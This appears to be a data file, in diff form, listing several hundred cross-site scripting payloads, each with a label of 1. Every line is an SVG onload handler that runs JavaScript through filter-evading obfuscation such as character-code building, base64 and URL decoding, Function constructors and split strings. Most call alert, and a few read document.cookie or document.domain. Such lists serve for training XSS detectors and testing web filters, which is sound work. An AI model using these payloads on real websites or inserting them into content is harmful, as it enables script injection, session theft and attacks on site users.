+<svg onload='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;'>	1
+<svg onload='&#x61;&#x6C;&#x65;&#x72;&#x74;`1`'>	1
+<svg onload='&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;'>	1
+<svg onload='&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)'>	1
+<svg onload='((()=>{})["constructor"]("al"+"ert(2)")())'></svg>	1
+<svg onload='((function(){})["constructor"]("al"+"ert(25)")())'></svg>	1
+<svg onload='(function(){var a=String;window[a.fromCharCode(97,108,101,114,116)](1)})()'></svg>	1
+<svg onload='(new Function("al"+"ert(21)"))()'></svg>	1
+<svg onload='(new Function("alert(42)"))()'>	1
+<svg onload='(new Function("return eval"))()(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'></svg>	1
+<svg onload='(new Function("return window"))()[["al","ert"].join("")](1)'></svg>	1
+<svg onload='Function("al" + "ert(30)")()'>	1
+<svg onload='Function("al"+"ert(1)")()'></svg>	1
+<svg onload='Function("al"+"ert(27)")()'></svg>	1
+<svg onload='Function("alert(46)")()'>	1
+<svg onload='Function("return ale"+"rt")()("1")'>	1
+<svg onload='Function(&#39;al&#39;+&#39;ert(11)&#39;)()'></svg>	1
+<svg onload='alert&#40;1&#41;'></svg>	1
+<svg onload='ev\u0061l(String.fromC\u0068arCode(97,108,101,114,116,40,39,88,83,83,39,41))'>	1
+<svg onload='eval((()=>{const a="alert";return a+"(1)";})())'>	1
+<svg onload='eval(Function("return String.fromCharCode(97,108,101,114,116,40,49,41)")())'>	1
+<svg onload='eval(Function("return \\u0061\\u006c\\u0065\\u0072\\u0074(1)")())'>	1
+<svg onload='eval(Function(`return unescape`)()("%61%6c%65%72%74(1)"))'></svg>	1
+<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74).concat(String.fromCharCode(0x28,0x31,0x30,0x30,0x29)))'>	1
+<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'>	1
+<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'></svg>	1
+<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,39,88,83,83,39,41))'>	1
+<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))'></svg>	1
+<svg onload='eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(39)+String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83)+String.fromCharCode(39)+String.fromCharCode(41))'>	1
+<svg onload='eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))'></svg>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))'>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116).concat(String.fromCharCode(40,49,50,51,41)))'>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>	1
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,54,41))'>	1
+<svg onload='eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)'></svg>	1
+<svg onload='eval(atob("YWxlcnQoIlhTUyIp"))'>	1
+<svg onload='eval(atob("YWxlcnQoJ1hTUycp"))'>	1
+<svg onload='eval(atob("YWxlcnQoJzEwMCcp"))'>	1
+<svg onload='eval(atob("YWxlcnQoJzEyMycp"))'>	1
+<svg onload='eval(atob("YWxlcnQoMSk="))'>	1
+<svg onload='eval(atob("YWxlcnQoMSk="))'></svg>	1
+<svg onload='eval(atob("YWxlcnQoMTAwKQ=="))'>	1
+<svg onload='eval(atob("YWxlcnQoMTExKQ=="))'>	1
+<svg onload='eval(atob("YWxlcnQoMTIzKQ=="))'>	1
+<svg onload='eval(atob("YWxlcnQoMTQp"))'>	1
+<svg onload='eval(atob("d2luZG93LmFsZXJ0KDEp"))'></svg>	1
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74%28%27%58%53%53%27%29"))'>	1
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'>	1
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'></svg>	1
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74%28%31%31%31%29"))'>	1
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74(1)"))'>	1
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74(1)"))'></svg>	1
+<svg onload='eval(unescape("%61%6c%65%72%74%28%27%58%53%53%27%29"))'>	1
+<svg onload='eval(unescape("%61%6c%65%72%74%28%31%29"))'>	1
+<svg onload='eval(unescape("%61%6c%65%72%74%28%31%31%31%29"))'>	1
+<svg onload='eval(unescape("%61%6c%65%72%74%28%31%32%33%29"))'>	1
+<svg onload='eval(unescape("%61%6c%65%72%74(1)"))'></svg>	1
+<svg onload='eval(window.atob("YWxlcnQoIlhTUyIp"))'>	1
+<svg onload='fetch(`data:text/javascript,al%65rt(1)`).then(res=>res.text()).then(eval)'>	1
+<svg onload='new Function("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")()'></svg>	1
+<svg onload='new Function("al" + "ert(10)")()'>	1
+<svg onload='new Function("al"+"ert(1)")()'></svg>	1
+<svg onload='new Function("ale"+"rt(1)")()'></svg>	1
+<svg onload='new Function("eval(String.fromCharCode(97,108,101,114,116,40,49,41))")()'></svg>	1
+<svg onload='new Function("return al"+"ert(1)")()'></svg>	1
+<svg onload='new Function(atob("YWxlcnQoMSk="))()'></svg>	1
+<svg onload='setInterval("\u0061\u006c\u0065\u0072\u0074(1)",1)'>	1
+<svg onload='setInterval(() => alert(1), 1000)'>	1
+<svg onload='setInterval(function(){alert(1)}, 1000)'>	1
+<svg onload='setTimeout("\u0061\u006c\u0065\u0072\u0074(1)",0)'>	1
+<svg onload='setTimeout(() => eval("&#97;&#108;&#101;&#114;&#116;(22)"), 0)'>	1
+<svg onload='setTimeout(() => window["al"+"ert"](50), 0)'>	1
+<svg onload='setTimeout(() => {eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)'></svg>	1
+<svg onload='setTimeout(Function(&#96;al&#101;rt(16)&#96;),0)'></svg>	1
+<svg onload='setTimeout(String.fromCharCode(97,108,101,114,116).concat("(",49,49,49,")"))'>	1
+<svg onload='setTimeout(`alert(1)`, 0)'>	1
+<svg onload='setTimeout(`eval(String.fromCharCode(97,108,101,114,116,40,49,41))`,0)'></svg>	1
+<svg onload='setTimeout(function(){alert(1)}, 0)'>	1
+<svg onload='setTimeout(function(){eval("al"+"ert(23)")},0)'></svg>	1
+<svg onload='setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)'></svg>	1
+<svg onload='setTimeout(function(){eval(atob("YWxlcnQoMSk="));},0)'>	1
+<svg onload='setTimeout(function(){window[String.fromCharCode(97,108,101,114,116)](1)},0)'></svg>	1
+<svg onload='this.remove();&#97;&#108;&#101;&#114;&#116;(`2`)'>	1
+<svg onload='this.remove();eval(atob("YWxlcnQoMTExKQ=="))'>	1
+<svg onload='this.removeAttribute(String.fromCharCode(111,110,108,111,97,100));eval(atob("YWxlcnQoIlhTUyIp"))'>	1
+<svg onload='window.setTimeout(String.fromCharCode(97,108,101,114,116,40,56,41),0)'></svg>	1
+<svg onload='window["\u0061\u006c\u0065\u0072\u0074"](1)'></svg>	1
+<svg onload='window["\x61\x6c\x65\x72\x74"]("\x58\x53\x53")'>	1
+<svg onload='window["\x61\x6c\x65\x72\x74"](1)'></svg>	1
+<svg onload='window["\x65\x76\x61\x6c"]("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29")'>	1
+<svg onload='window["al"+"ert"]("1")'>	1
+<svg onload='window["al"+"ert"](1)'>	1
+<svg onload='window["al"+"ert"](1)'></svg>	1
+<svg onload='window["al"+"ert"](18)'></svg>	1
+<svg onload='window["al"+"ert"](38)'>	1
+<svg onload='window["al"+"ert"](String.fromCharCode(50,54))'>	1
+<svg onload='window["al"+"ert"](`1`)'>	1
+<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>	1
+<svg onload='window[atob("YWxlcnQ=")](1)'></svg>	1
+<svg onload='window[eval(atob("d2luZG93LmFsZXJ0KDEp"))]'></svg>	1
+<svg onload=Function('\u0061\u006c\u0065\u0072\u0074(38)')()>	1
+<svg onload=Function('\u0061lert(1)')()></svg>	1
+<svg onload=Function('al'+'ert(1)')()>	1
+<svg onload=Function('al'+'ert(1)')()></svg>	1
+<svg onload=Function('al'+'ert(14)')()>	1
+<svg onload=Function('window["al"+"ert"](1)')()></svg>	1
+<svg onload=Function(atob('cmV0dXJuIGFsZXJ0'))()(1)>	1
+<svg onload=\u0061\u006c\u0065\u0072\u0074(2)>	1
+<svg onload=eval("al&#101rt(1)")>	1
+<svg onload=eval("al\u0065rt(1)")>	1
+<svg onload=eval(&#x61;&#x6c;&#x65;&#x72;&#x74;(1))></svg>	1
+<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>	1
+<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>	1
+<svg onload=eval(''.concat('a','l','e','r','t')+'(1)')>	1
+<svg onload=eval(''.concat('aler','t(1)'))></svg>	1
+<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>	1
+<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')></svg>	1
+<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(34)')>	1
+<svg onload=eval('\u0061l\u0065rt\u0028\u0027XSS\u0027\u0029')>	1
+<svg onload=eval('\u0061lert(1)')></svg>	1
+<svg onload=eval('\u0061lert(3)')>	1
+<svg onload=eval('\u0061lert(5)')>	1
+<svg onload=eval('\x61\x6c\x65\x72\x74(1)')>	1
+<svg onload=eval('a'+String.fromCharCode(108,101,114,116)+'(1)')>	1
+<svg onload=eval('a\x6Cert(1)')>	1
+<svg onload=eval('al'+'ert(1)')>	1
+<svg onload=eval('al'+'ert(1)')></svg>	1
+<svg onload=eval('al'+'ert(10)')>	1
+<svg onload=eval('al'+String.fromCharCode(101,114,116)+'(1)')>	1
+<svg onload=eval('al\x65rt(0x7b)')>	1
+<svg onload=eval('al\x65rt(111)')>	1
+<svg onload=eval('wind'+'ow["al"+"ert"](123)')>	1
+<svg onload=eval('window["a"+"lert"]')(1)>	1
+<svg onload=eval('window[String.fromCharCode(97,108,101,114,116)](1)')>	1
+<svg onload=eval(String.fromCharCode(...[97,108,101,114,116,40,49,41]))>	1
+<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(1)')>	1
+<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(111)')>	1
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+'(1)')>	1
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>	1
+<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(101,118,97,108)+String.fromCharCode(40,97,108,101,114,116,40,49,41,41))>	1
+<svg onload=eval(String.fromCharCode(101,118,97,108,40,39,97,108,101,114,116,40,49,41,39,41))></svg>	1
+<svg onload=eval(String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,39,88,83,83,39,41))>	1
+<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,32,46,32,97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97)+'lert(1)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(111)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(2)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(4)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(5)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.cookie)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.domain)')>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101,114,116,40,49,41))></svg>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101)+String.fromCharCode(114,116,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,49,49,41))>	1
+<svg onload=eval(String.fromCharCode(97)+atob('bGVydCgxKQ=='))>	1
+<svg onload=eval(String.fromCharCode(97)+unescape('%6c%65%72%74(1)'))>	1
+<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+'(1)')>	1
+<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+String.fromCharCode(40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97,108,101)+'rt(1)')>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116))(1)>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(3)')>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116)+String.fromCharCode(40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116)+`(1)`)>></svg>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116).concat('(1)'))>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) />	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>	1
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>	1
+<svg onload=eval(String.fromCodePoint(97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(String['fromCharCode'](97,108,101,114,116).concat('(1)'))>	1
+<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))></svg>	1
+<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`) />	1
+<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>	1
+<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(2)`)>	1
+<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074`+String.fromCharCode(40,49,41))>	1
+<svg onload=eval(`\\u0061l\\u0065rt(1)`)>	1
+<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>	1
+<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074`+'(1)')>	1
+<svg onload=eval(`\x61\x6c\x65\x72\x74(1)`)>	1
+<svg onload=eval(`al\x65rt(1)`)></svg>	1
+<svg onload=eval(`window['al'+'ert'](1)`)>	1
+<svg onload=eval(atob("YWxlcnQoMSk="))></svg>	1
+<svg onload=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>	1
+<svg onload=eval(atob(&#34;d2luZG93WydhbGVydCddKDEp&#34;))>	1
+<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>	1
+<svg onload=eval(atob(&quot;d2luZG93LmFsZXJ0KDEp&quot;))>	1
+<svg onload=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>	1
+<svg onload=eval(atob('YWx'+'lcnQoMSk='))>	1
+<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>	1
+<svg onload=eval(atob('YWxlcnQoMSk=')) />	1
+<svg onload=eval(atob('YWxlcnQoMSk='))>	1
+<svg onload=eval(atob('YWxlcnQoMSk='))></svg>	1
+<svg onload=eval(atob('YWxlcnQoMTEp'))>	1
+<svg onload=eval(atob('YWxlcnQoMTEwKQ=='))>	1
+<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>	1
+<svg onload=eval(atob('YWxlcnQoMTEzKQ=='))>	1
+<svg onload=eval(atob('YWxlcnQoMik='))>	1
+<svg onload=eval(atob('YWxlcnQoNCk='))>	1
+<svg onload=eval(atob('YWxlcnQoNik='))>	1
+<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>	1
+<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>	1
+<svg onload=eval(atob('c2V0VGltZW91dCgoKT0+YWxlcnQoMSksMTAwMCk='))>	1
+<svg onload=eval(atob('d2luZG93LmFsZXJ0KDEp'))>	1
+<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>	1
+<svg onload=eval(atob(`YWxlcnQoMSk=`))>	1
+<svg onload=eval(decodeURI('%61%6C%65%72%74%28%31%29'))>	1
+<svg onload=eval(decodeURI('%61%6C%65%72%74(1)'))>	1
+<svg onload=eval(decodeURI('%61%6c%65%72%74(1)'))>	1
+<svg onload=eval(decodeURIComponent("%61%6c%65%72%74%281%29"))>	1
+<svg onload=eval(decodeURIComponent(&#39;%61%6C%65%72%74%28%31%29&#39;))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%31%31%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%32%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%34%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))></svg>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)')) />	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></svg>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(2)'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(3)'))>	1
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(7)'))>	1
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></svg>	1
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%281%29'))>	1
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%281%29'))></svg>	1
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>	1
+<svg onload=eval(decodeURIComponent('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>	1
+<svg onload=eval(decodeURIComponent('\u0061\u006c\u0065\u0072\u0074(1)'))>	1
+<svg onload=eval(decodeURIComponent('al%65rt(1)'))>	1
+<svg onload=eval(decodeURIComponent(`%61%6C%65%72%74(1)`))>	1
+<svg onload=eval(decodeURIComponent(`%61lert(1)`))>	1
+<svg onload=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>	1
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,50,41))>	1
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,53,41))>	1
+<svg onload=eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))>	1
+<svg onload=eval(unescape('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))>	1
+<svg onload=eval(unescape('%61%6C%65%72%74%281%29'))></svg>	1
+<svg onload=eval(unescape('%61%6C%65%72%74(1)'))>	1
+<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>	1
+<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>	1
+<svg onload=eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))>	1
+<svg onload=eval(unescape('%61%6c%65%72%74%281%29'))>	1
+<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>	1
+<svg onload=eval(unescape('%61%6c%65%72%74(49)'))>	1
+<svg onload=eval(unescape('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>	1
+<svg onload=eval(unescape('%u0061%u006c%u0065%u0072%u0074%28%u0031%u0031%u0031%29'))>	1
+<svg onload=eval(unescape('\u0061\u006c\u0065\u0072\u0074(1)'))>	1
+<svg onload=eval(window.atob('YWxlcnQoMSk='))>	1
+<svg onload=eval(window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(1)'))>	1
+<svg onload=eval(window['atob']('YWxlcnQoMSk='))>	1
+<svg onload=eval(window['unescape']('%61%6c%65%72%74(49)'))>	1
+<svg onload=import('data:text/javascript,al%65rt(123)')>	1
+<svg onload=location='javascript:'+unescape('%61%6C%65%72%74(1)')>	1
+<svg onload=location=`javas`+`cript:al`+`ert(1)`>	1
+<svg onload=location=`javascr`+`ipt:al`+`ert(1)`>	1
+<svg onload=setInterval('al'+'ert(1)',0)>	1
+<svg onload=setInterval('al'+'ert(1)',1)>	1
+<svg onload=setInterval('al'+'ert(1)',1000)></svg>	1
+<svg onload=setInterval('al'+'ert(1)',999)>	1
+<svg onload=setInterval(String.fromCharCode(97,108,101,114,116)+'(1)',50)>	1
+<svg onload=setInterval(atob('YWxlcnQoMSk='),100)>	1
+<svg onload=setInterval(window['al'+'ert'],1,1)>	1
+<svg onload=setInterval(window[String.fromCharCode(97,108,101,114,116)],1,1)>	1
+<svg onload=setTimeout(&#x61;&#x6C;&#x65;&#x72;&#x74;(1),0)>	1
+<svg onload=setTimeout('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)',0)>	1
+<svg onload=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)',0)>	1
+<svg onload=setTimeout('a'+'lert(1)',0)>	1
+<svg onload=setTimeout('al'+'\x65rt(1)',0)>	1
+<svg onload=setTimeout('al'+'ert(1)',0)>	1
+<svg onload=setTimeout('al'+'ert(123)',0)>	1
+<svg onload=setTimeout('al'+'ert(2)',0)>	1
+<svg onload=setTimeout('ev'+'al(`al\\u0065rt(1)`)')>	1
+<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116))(1)',0)>	1
+<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116)+`(1)`)')>	1
+<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)>	1
+<svg onload=setTimeout('eval(`\\u0061lert(1)`)')>	1
+<svg onload=setTimeout('eval(atob("YWxlcnQoMSk="))',0)>	1
+<svg onload=setTimeout('eval(unescape("%61%6c%65%72%74(1)"))',0)></svg>	1
+<svg onload=setTimeout('eval(unescape(`%61lert(1)`))',0)>	1
+<svg onload=setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)>	1
+<svg onload=setTimeout(Function('al'+'ert(1)'),0)>	1
+<svg onload=setTimeout(Function.prototype.constructor('al'+'ert(1)'),0)>	1
+<svg onload=setTimeout(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)',0)>	1
+<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>	1
+<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>	1
+<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>	1
+<svg onload=setTimeout(`;\u0061lert(1)`,0)>	1
+<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>	1
+<svg onload=setTimeout(`al${String.fromCharCode(101,114,116)}(1)`,0)>	1
+<svg onload=setTimeout(`al`+`ert(1)`,0)></svg>	1
+<svg onload=setTimeout(`al`+`ert(1)`,5)>	1
+<svg onload=setTimeout(`eval('\\u0061lert(1)')`,0)>	1
+<svg onload=setTimeout(atob("YWxlcnQoMSk="),0)>	1
+<svg onload=setTimeout(atob('YWxlcnQ=')+'(1)',0)>	1
+<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>	1
+<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74%28%31%29'),0)>	1
+<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74%28%31%31%31%29'))>	1
+<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>	1
+<svg onload=setTimeout(eval('unescape(`%61%6c%65%72%74(1)`)'),0)>	1
+<svg onload=setTimeout(function(){window['al'+'ert'](1)},0)>	1
+<svg onload=setTimeout(function(){window[String.fromCharCode(97,108,101,114,116)](1)},0)>	1
+<svg onload=setTimeout(unescape('%61%6C%65%72%74(1)'),0)>	1
+<svg onload=setTimeout(window['al'+'ert'](1),0)>	1
+<svg onload=setTimeout(window[atob('YWxlcnQ=')],0,1)>	1
+<svg onload=top[&quot;a&quot;+&quot;ler&quot;+&quot;t&quot;](1)>	1
+<svg onload=top['ale\x72t'](1)>	1
+<svg onload=window.setTimeout('al'+'ert(1)',0)>	1
+<svg onload=window["a"+"l"+"ert"](1)>	1
+<svg onload=window["ev"+"al"]("al"+"ert(1)")>	1
+<svg onload=window["eval"]("a"+"le"+"rt()(1)")>	1
+<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>	1
+<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>	1
+<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](30)>	1
+<svg onload=window['\u0061lert'](1)>	1
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>	1
+<svg onload=window['\x61\x6c\x65\x72\x74'](`\x31`)>	1
+<svg onload=window['\x65va\x6c']('ale'+'rt(1)')>	1
+<svg onload=window['a'+'l'+'ert'](1)></svg>	1
+<svg onload=window['a'+'lert'](1)>	1
+<svg onload=window['al'+'\u0065rt'](1)>	1
+<svg onload=window['al'+'\x65rt'](1)>	1
+<svg onload=window['al'+'ert']('X'+'SS')>	1
+<svg onload=window['al'+'ert'](0x1)>	1
+<svg onload=window['al'+'ert'](1)>	1
+<svg onload=window['al'+'ert'](1)></svg>	1
+<svg onload=window['al'+'ert'](6)>	1
+<svg onload=window['al'+'ert'](String.fromCharCode(49))>	1
+<svg onload=window['al'+'ert'](atob('MTEz'))>	1
+<svg onload=window['al'+'ert'](document['cookie'])>	1
+<svg onload=window['al'+'ert'].apply(null,[1])>	1
+<svg onload=window['al'+'ert'].call(null,1)>	1
+<svg onload=window['al'+unescape('%65%72%74')](1)>	1
+<svg onload=window['al\x65rt']((Math.random()+1).toString(36).substring(7))>	1
+<svg onload=window['al\x65rt'](1)>	1
+<svg onload=window['ev'+'al']('ale'+'rt(49,49,49)')>	1
+<svg onload=window['ev'+'al'](String.fromCharCode(97,108,101,114,116)+'(1)')>	1
+<svg onload=window['ev'+'al'](atob('YWxlcnQoMSk='))>	1
+<svg onload=window['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))>	1
+<svg onload=window[String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)](1)>	1
+<svg onload=window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))>	1
